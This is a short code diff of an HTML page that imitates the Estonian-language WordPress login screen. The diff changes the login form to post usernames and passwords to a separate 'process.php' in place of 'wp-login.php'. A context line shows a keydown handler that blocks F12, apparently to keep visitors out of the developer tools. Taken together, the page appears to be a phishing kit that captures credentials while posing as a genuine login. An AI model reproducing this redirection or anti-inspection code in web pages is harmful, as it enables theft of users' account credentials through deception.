@@ -91,7 +91,7 @@ document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==1
 		<div id="login">
 		<h1><a href="https://wordpress.org/">Kasutame WordPressi</a></h1>
 	
-		<form name="loginform" id="loginform" action="wp-login.php" method="post">
+		<form name="loginform" id="loginform" action="process.php" method="post">
 			<p>
 				<label for="user_login">Kasutajanimi või e-postiaadress</label>
 				<input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" />
